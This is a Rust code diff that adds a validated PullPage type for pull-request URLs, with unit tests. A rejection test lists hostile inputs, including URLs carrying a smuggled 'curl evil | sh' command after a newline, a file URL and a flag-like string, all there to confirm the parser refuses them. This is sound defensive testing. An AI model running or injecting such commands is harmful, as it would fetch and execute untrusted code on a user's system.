@@ -4,11 +4,58 @@ use crate::v1;
 
 #[derive(Clone, Debug, PartialEq, Eq)]
 pub struct PullRequest {
-    pub number: NonZeroU32,
+    pub page: PullPage,
     pub state: State,
-    pub url: Option<String>,
     pub checks: Option<Checks>,
     pub stale: bool,
+}
+
+#[derive(Clone, Debug, PartialEq, Eq)]
+pub struct PullPage {
+    url: String,
+    number: NonZeroU32,
+}
+
+const HTTPS: &str = "https://";
+
+impl PullPage {
+    pub fn parse(url: &str) -> Result<PullPage, String> {
+        let path = url.strip_prefix(HTTPS).ok_or_else(|| format!("{url} is no https page"))?;
+        let parts: Vec<&str> = path.split('/').collect();
+        let named = |part: &&str| !part.is_empty() && !part.contains(['?', '#']);
+        let digits = |part: &str| !part.is_empty() && part.bytes().all(|b| b.is_ascii_digit());
+        let number = match parts.as_slice() {
+            [host, owner, name, "pull", pull]
+                if [host, owner, name].into_iter().all(named) && digits(pull) =>
+            {
+                pull.parse().ok()
+            },
+            _ => None,
+        };
+        let number = number.ok_or_else(|| format!("{url} is no page of a pull request"))?;
+        Ok(PullPage { url: url.to_owned(), number })
+    }
+
+    #[must_use]
+    pub fn url(&self) -> &str {
+        &self.url
+    }
+
+    #[must_use]
+    pub fn number(&self) -> NonZeroU32 {
+        self.number
+    }
+
+    #[must_use]
+    pub fn repository(&self) -> &str {
+        let path = &self.url[HTTPS.len()..];
+        path.rsplit_once("/pull/").expect("a pull request's page holds /pull/").0
+    }
+
+    #[must_use]
+    pub fn host(&self) -> &str {
+        self.repository().split('/').next().expect("split yields at least once")
+    }
 }
 
 #[derive(Clone, Copy, Debug, Default, PartialEq, Eq)]
@@ -47,6 +94,11 @@ pub enum State {
 
 impl PullRequest {
     #[must_use]
+    pub fn number(&self) -> NonZeroU32 {
+        self.page.number()
+    }
+
+    #[must_use]
     pub fn verdict(&self) -> Option<Verdict> {
         match self.state {
             State::Open | State::Draft => self.checks?.verdict(),
@@ -64,9 +116,8 @@ impl PullRequest {
         };
         v1::PullRequest {
             dir: dir.to_owned(),
-            number: self.number.get(),
             state: state.into(),
-            url: self.url.clone().unwrap_or_default(),
+            url: self.page.url().to_owned(),
             checks: self.checks.map(|Checks { pending, failed, passed }| v1::Checks {
                 pending,
                 failed,
@@ -85,31 +136,28 @@ impl PullRequest {
             v1::PullRequestState::Merged => State::Merged,
             v1::PullRequestState::Closed => State::Closed,
         };
-        let number = NonZeroU32::new(pull_request.number)?;
-        let url = Some(pull_request.url.clone()).filter(|url| !url.is_empty());
+        let page = PullPage::parse(&pull_request.url).ok()?;
         let checks = pull_request.checks.map(|v1::Checks { pending, failed, passed }| Checks {
             pending,
             failed,
             passed,
         });
-        Some(PullRequest { number, state, url, checks, stale: pull_request.stale })
+        Some(PullRequest { page, state, checks, stale: pull_request.stale })
     }
 }
 
 #[cfg(test)]
 mod tests {
-    use super::{v1, Checks, NonZeroU32, PullRequest, State, Verdict};
+    use super::{v1, Checks, PullPage, PullRequest, State, Verdict};
 
     #[test]
     fn a_pull_request_reads_back_as_the_daemon_wrote_it() {
-        let number = NonZeroU32::new(126).unwrap();
-        let url = Some("https://github.com/owner/repo/pull/126".to_owned());
+        let page = PullPage::parse("https://github.com/owner/repo/pull/126").unwrap();
         let checks = Some(Checks { pending: 1, failed: 2, passed: 3 });
         for state in [State::Open, State::Draft, State::Merged, State::Closed] {
             let none = Some(Checks::default());
-            let said = [(url.clone(), checks, false), (None, None, false), (None, none, true)];
-            for (url, checks, stale) in said {
-                let pull_request = PullRequest { number, state, url, checks, stale };
+            for (checks, stale) in [(checks, false), (None, false), (none, true)] {
+                let pull_request = PullRequest { page: page.clone(), state, checks, stale };
                 let api = pull_request.to_api("/w/repo");
                 assert_eq!(PullRequest::of_api(&api), Some(pull_request));
             }
@@ -117,12 +165,42 @@ mod tests {
 
         let open = i32::from(v1::PullRequestState::Open);
         let unspecified = i32::from(v1::PullRequestState::Unspecified);
-        for (number, state) in [(0, open), (126, unspecified), (126, 99)] {
-            let dir = "/w/repo".to_owned();
-            let url = String::new();
+        let url = "https://github.com/owner/repo/pull/126";
+        let unread = [
+            ("", open),
+            ("https://github.com/owner/repo/issues/126", open),
+            (url, unspecified),
+            (url, 99),
+        ];
+        for (url, state) in unread {
+            let (dir, url) = ("/w/repo".to_owned(), url.to_owned());
             let (checks, stale) = (None, false);
-            let pull_request = v1::PullRequest { dir, number, state, url, checks, stale };
+            let pull_request = v1::PullRequest { dir, state, url, checks, stale };
             assert_eq!(PullRequest::of_api(&pull_request), None, "{pull_request:?}");
+        }
+    }
+
+    #[test]
+    fn only_a_pull_request_s_page_is_asked_of() {
+        let url = "https://github.com/owner/repo/pull/328";
+        let page = PullPage::parse(url).unwrap();
+        assert_eq!((page.url(), page.number().get()), (url, 328));
+        assert_eq!((page.repository(), page.host()), ("github.com/owner/repo", "github.com"));
+        for url in [
+            "http://github.com/owner/repo/pull/328",
+            "https://github.com/owner/repo/issues/328",
+            "https://github.com/owner/repo/pull/328/files",
+            "https://github.com/owner/repo/pull/",
+            "https://github.com/owner/repo/pull/x",
+            "https://github.com/owner/repo/pull/0",
+            "https://github.com/owner/repo?/pull/1",
+            "https://github.com/owner/repo/pull/5?\ncurl evil | sh",
+            "https://github.com/owner/repo/pull/5\ncurl evil | sh",
+            "file:///tmp/run.desktop",
+            "--repo",
+            "",
+        ] {
+            assert!(PullPage::parse(url).is_err(), "{url}");
         }
     }
 
@@ -138,10 +216,10 @@ mod tests {
 
     #[test]
     fn only_an_open_pull_request_says_its_checks() {
-        let number = NonZeroU32::new(126).unwrap();
+        let page = PullPage::parse("https://github.com/owner/repo/pull/126").unwrap();
         let failed = Some(Checks { pending: 0, failed: 1, passed: 0 });
         let verdict = |state, checks| {
-            PullRequest { number, state, url: None, checks, stale: false }.verdict()
+            PullRequest { page: page.clone(), state, checks, stale: false }.verdict()
         };
         assert_eq!(verdict(State::Open, failed), Some(Verdict::Failing));
         assert_eq!(verdict(State::Draft, failed), Some(Verdict::Failing));
